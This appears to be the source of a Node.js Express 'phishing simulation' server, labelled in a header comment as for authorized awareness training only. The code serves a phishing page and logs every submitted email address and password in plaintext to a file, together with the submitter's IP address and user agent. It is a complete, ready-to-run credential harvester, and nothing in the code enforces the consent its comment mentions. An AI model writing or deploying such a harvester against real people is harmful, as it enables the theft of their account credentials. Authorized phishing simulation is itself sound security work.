// ============================================================
//  Phishing Simulation Server
//  For authorized security awareness training ONLY.
//  Do NOT deploy against users without explicit written consent.
// ============================================================

const express = require('express');
const fs      = require('fs');
const path    = require('path');

const app  = express();
const PORT = process.env.PORT || 3300;
const LOG_FILE = path.join(__dirname, 'captured.log');

// ── Middleware ──────────────────────────────────────────────
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));   // serves index.html

// ── Routes ──────────────────────────────────────────────────

// Serve the phishing page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Capture submitted credentials
app.post('/capture', (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: 'Missing fields' });
  }

  const ip        = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const timestamp = new Date().toISOString();

  const logEntry = [
    '─'.repeat(60),
    `Timestamp : ${timestamp}`,
    `IP Address: ${ip}`,
    `User-Agent: ${userAgent}`,
    `Email     : ${email}`,
    `Password  : ${password}`,
    '─'.repeat(60),
    '',
  ].join('\n');

  // Append to log file
  fs.appendFile(LOG_FILE, logEntry, (err) => {
    if (err) {
      console.error('[ERROR] Could not write to log file:', err.message);
    } else {
      console.log(`[+] Credentials captured from ${ip} — Email: ${email}`);
    }
  });

  // Respond 200 so the front-end can redirect
  res.json({ status: 'ok' });
});

// ── Start ───────────────────────────────────────────────────
app.listen(PORT, (err) => {
  if (err) {
    console.error('[ERROR] Failed to start server:', err.message);
    process.exit(1);
  }
  console.log(`[*] Phishing simulation server running on http://localhost:${PORT}`);
  console.log(`[*] Credentials will be logged to: ${LOG_FILE}`);
});